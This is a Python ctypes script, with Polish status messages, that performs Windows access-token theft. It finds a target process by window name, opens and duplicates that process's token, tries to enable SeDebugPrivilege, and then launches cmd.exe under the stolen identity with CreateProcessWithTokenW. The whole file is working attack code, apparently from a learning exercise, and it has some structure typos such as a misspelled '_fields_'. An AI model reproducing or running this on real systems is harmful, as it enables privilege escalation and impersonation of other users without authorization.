import ctypes
from ctypes.wintypes import DWORD, LPVOID, LPWSTR, HANDLE, LPBYTE, BOOL, WORD

k_handle = ctypes.WinDLL("Kernel32.dll")
u_handle = ctypes.WinDLL("User32.dll")
a_handle = ctypes.WinDLL("Advapi32.dll")


# Access Rights
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)

SE_PRIVILEGE_ENABLED = 0x00000002

# Token Access Rights
STANDARD_RIGHTS_REQUIRED = 0x000F0000
STANDARD_RIGHTS_READ = 0x00020000
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATION = 0x0004
TOKEN_QUERY = 0x0008
TOKEN_QUERY_SOURCE = 0x0010
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_ADJUST_GROUPS = 0x0040
TOKEN_ADJUST_DEFAULT = 0x0080
TOKEN_ADJUST_SESSIONID = 0x0100
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | 
					TOKEN_ASSIGN_PRIMARY     |
					TOKEN_DUPLICATE          |
					TOKEN_IMPERSONATION      |
					TOKEN_QUERY              |
					TOKEN_QUERY_SOURCE       |
					TOKEN_ADJUST_PRIVILEGES  |
					TOKEN_ADJUST_GROUPS      |
					TOKEN_ADJUST_DEFAULT     |
					TOKEN_ADJUST_SESSIONID)

class LUID(ctypes.Structure):
    _fields_ = [
    ("LowPart", DWORD),
    ("HighPart", DWORD),
    ]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
    ("Luid", LUID),
    ("Attributes", DWORD),
    ]

class PRIVILEGE_SET(ctypes.Structure):
    _fields_ = [
    ("PrivilegeCount", DWORD),
    ("Control", DWORD),
    ("Privileges", LUID_AND_ATTRIBUTES),
    ]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
    ("Privilegecount", DWORD),
    ("Privileges", LUID_AND_ATTRIBUTES),
    ]

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fiels_ = [
    ("nLength", DWORD),
    ("lpSecurityDescriptor", HANDLE),
    ("bInheritHandl", BOOL),
    ]

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
    ("cb", DWORD),
    ("lpReserved", LPWSTR),
    ("lpDesktop", LPWSTR),
    ("lpTitle", LPWSTR),
    ("dwX", DWORD),
    ("dwY", DWORD),
    ("dwXSize", DWORD),
    ("dwYSize", DWORD),
    ("dwXCountChars", DWORD),
    ("dwYCountChars", DWORD),
    ("dwFillAttribute", DWORD),
    ("dwFlags", DWORD),
    ("wShowWindow", WORD),
    ("cbReserved2", WORD),
    ("lpReserved2", LPBYTE),
    ("hStdInput", HANDLE),
    ("hStdOutput", HANDLE),
    ("hStdError", HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
    ("hProcess", HANDLE),
    ("hThread", HANDLE),
    ("dwProcessId", DWORD),
    ("dwThreadId", DWORD),
    ]

def enablePrivilege(priv, handle):
    
    requiredPrivileges = PRIVILEGE_SET()
    requiredPrivileges.PrivilegeCount = 1
    requiredPrivileges.Privileges = LUID_AND_ATTRIBUTES()
    requiredPrivileges.Privileges.Luid = LUID()

    lpSystemName = None
    lpName = priv
    
    response = a_handle.LookupPrivilegeValueW(lpSystemName, lpName, ctypes.byref(requiredPrivileges.Privileges.Luid))
    if response <= 0:
        print("Error code {} - Nie udalo sie pobrac uchwytu tokenu".format(k_handle.GetLastError()))
    else:
        print("Mamy LUID..")

        
    pfResult = ctypes.c_long()

    response = a_handle.PrivilegeCheck(handle, ctypes.byref(requiredPrivileges), ctypes.byref(pfResult))

    if response <= 0:
        print("Error code {} - Nie udalo sie pobrac uprawnien".format(k_handle.GetLastError()))
    else:
        print("Priv Check..")

    if pfResult:
        print("Odnaleziono {} priv".format(lpName))
        return 0
    else:
        print("Nie Odnaleziono {} priv".format(lpName))
        requiredPrivileges.Privileges.Attributes = SE_PRIVILEGE_ENABLED

    DisableAllPrivileges = False
    NewState = TOKEN_PRIVILEGES()
    BufferLength = ctypes.sizeof(NewState)
    PreviousState = ctypes.c_void_p()
    ReturnLength = ctypes.c_void_p()

    NewState.PrivilegeCount = 1
    NewState.Privileges = requiredPrivileges.Privileges

    response = a_handle.AdjustTokenPrivileges(handle,
                                              DisableAllPrivileges,
                                              ctypes.byref(NewState),
                                              BufferLength,
                                              ctypes.byref(PreviousState),
                                              ctypes.byref(ReturnLength))
    if response > 0:
        print("Uprawnienia tokenu {} wlaczone...".format(priv))
    else:
        print("Uprawnienia tokenu {} wylaczone... Code {}".format(priv, k_handle.GetLastError()))
        
    return 0


lpWindowName = ctypes.c_char_p(input("Podaj nazwe okna: ").encode('utf-8'))

hwmd = u_handle.FindWindowA(None, lpWindowName)

if hwmd == 0:
    print("Error code {} - Nie udalo sie pobrac uchwytu".format(k_handle.GetLastError()))
    exit(1)
else:
    print("Mamy uchwyt...")

lpdwProcessId = ctypes.c_ulong()

response = u_handle.GetWindowThreadProcessId(hwmd, ctypes.byref(lpdwProcessId))

if response == 0:
    print("Error code {} - Nie udalo sie pobrac PIDu".format(k_handle.GetLastError()))
    exit(1)
else:
    print("Mamy PID...")

dwDesiredProcess = PROCESS_QUERY_LIMITED_INFORMATION #PROCESS_ALL_ACCESS
bInheritHandle = False
dwProcessId = lpdwProcessId

hProcess = k_handle.OpenProcess(dwDesiredProcess, bInheritHandle, dwProcessId)

if hProcess <= 0:
    print("Error code {} - Nie udalo sie pobrac uchwytu porzadanego processu".format(k_handle.GetLastError()))
else:
    print("Mamy nasz proces...")

ProcessHandle = hProcess
DesiredAccess = TOKEN_ALL_ACCESS
TokenHandle = ctypes.c_void_p()

response = k_handle.OpenProcessToken(ProcessHandle, DesiredAccess, ctypes.byref(TokenHandle))

if response <= 0:
    print("Error code {} - Nie udalo sie pobrac uchwytu tokenu".format(k_handle.GetLastError()))
else:
    print("Mamy token...")

dwProcessId = k_handle.GetCurrentProcessId()
CurrentProcessHandle = k_handle.OpenProcess(dwDesiredProcess, bInheritHandle, dwProcessId)
CurrentTokenHandle = ctypes.c_void_p()
CurrentProcessTokenHandle = k_handle.OpenProcessToken(CurrentProcessHandle, DesiredAccess, ctypes.byref(CurrentTokenHandle))

response = enablePrivilege("SEDebugPrivilege", CurrentTokenHandle)
if response != 0:   
    print("nie udalo sie wlaczyc uprawnien...")


hExistingToken = ctypes.c_void_p()
dwDesiredAccess = TOKEN_ALL_ACCESS
lpTokenAttributes = SECURITY_ATTRIBUTES()
ImpersonationLevel = 2
TokenType = 1

lpTokenAttributes.nLength = ctypes.sizeof(lpTokenAttributes)
lpTokenAttributes.lpSecurityDescriptor = ctypes.c_void_p()
lpTokenAttributes.bInheritHandle = False

response = a_handle.DuplicateTokenEx(TokenHandle, dwDesiredAccess, ctypes.byref(lpTokenAttributes), ImpersonationLevel, TokenType, ctypes.byref(hExistingToken))

if response == 0:   
    print("Nie udalo sie zduplikowac tokenu... Code {}".format(k_handle.GetLastError()))
else:
    print("Zduplikowano process")

hToken = hExistingToken
dwLogonFlags = 0x00000001
lpApplicationName = "C:\\Windows\\System32\\cmd.exe"
lpCommandLine = None
dwCreationFlags = 0x00000010
lpEnvironment = ctypes.c_void_p()
lpCurrentDirectory = None
lpStartupInfo = STARTUPINFO()
lpProcessInformation = PROCESS_INFORMATION()

lpStartupInfo.wShowWindow = 0x1
lpStartupInfo.dwFlags = 0x1
lpStartupInfo.cb = ctypes.sizeof(lpStartupInfo)

response = a_handle.CreateProcessWithTokenW(hToken,
                                            dwLogonFlags,
                                            lpApplicationName,
                                            lpCommandLine,
                                            dwCreationFlags,
                                            lpEnvironment,
                                            lpCurrentDirectory,
                                            ctypes.byref(lpStartupInfo),
                                            ctypes.byref(lpProcessInformation))

if response == 0:   
    print("Nie udalo sie utworzyc nowego procesu z pobranym tokenem... Code {}".format(k_handle.GetLastError()))
else:
    print("Impersonowany proces nadchodzi")
